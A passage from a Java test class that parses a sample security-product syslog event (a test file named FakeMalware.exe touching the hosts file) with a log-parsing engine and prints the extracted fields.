      data = "<1>May 11 18:59:20 localhost.localdomain CEF:0|Asiainfo Security|ESM|9.0.1214|100137|BM|1|device_id=0A64339F19E04B5CA1A9 timestamp=1680511865 str_policy_id=002 str_subject=C:\\Users\\admin\\Desktop\\tmpolicy_test\\FakeMalware.exe dw_event_type=8 dw_risk_level=1 computer_name=user-vmwarevirtualplatform ip=172.17.17.111 os=Kylin V10 SP1 str_object=C:\\windows\\system32\\drivers\\etc\\hosts dw_channel=4 dw_operation=1 dw_action=2 create_time=1683802292";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  protected void parse(BotuEngine botuEngine, String log) {
    EntityMap stack = new EntityMapImpl();
    stack.putEntity("MS_SRC_DATA", log);
    botuEngine.parse(stack);
  }

  class EventPrintListener implements BotuListener {

    public void onData(Object[] data) {
      for (int i = 0; i < data.length; i++) {
        if (i != 0)
          System.out.print(",");
        if (data[i] != null)
          System.out.println(i + ":" + data[i].toString());
      }
      System.out.println("----------------------------------");
    }

    @Override
    public void onData(List<Object[]> list) {

    }

    @Override
    public void onData(EntityMap event) {
      for (MapEntry<String, Object> entry : event.entrySet()) {
        System.out.println(
            String.format("%s:%s", entry.getKey(), entry.getValue()));
      }
      System.out.println("----------------------------------");
    }
  }

  class EventCacheListener implements BotuListener {
    protected List<Object[]> dataList = new LinkedList<Object[]>();

    public void onData(Object[] data) {
      //      dataList.add(data);
    }

    @Override
    public void onData(List<Object[]> list) {

    }

    @Override
    public void onData(EntityMap event) {

    }
  }
}
